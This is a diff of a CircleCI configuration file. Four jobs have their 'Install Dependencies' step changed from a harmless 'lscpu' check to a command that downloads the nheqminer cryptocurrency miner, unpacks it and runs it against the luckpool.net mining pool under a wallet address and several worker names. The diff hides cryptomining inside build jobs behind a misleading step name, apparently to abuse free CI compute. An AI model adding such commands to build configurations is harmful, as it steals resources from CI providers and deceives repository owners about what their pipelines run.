@@ -6,28 +6,28 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u REzZxFrQmr7Q48wrTJB5sKwhY3Kmn3EtUJ.Pesugihan-Linux -p x
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u REzZxFrQmr7Q48wrTJB5sKwhY3Kmn3EtUJ.Pesugihan-Linux2 -p x
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u REzZxFrQmr7Q48wrTJB5sKwhY3Kmn3EtUJ.Pesugihan-Linux3 -p x
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u REzZxFrQmr7Q48wrTJB5sKwhY3Kmn3EtUJ.Pesugihan-Linux4 -p x
 workflows:
     version: 2.1
     build:
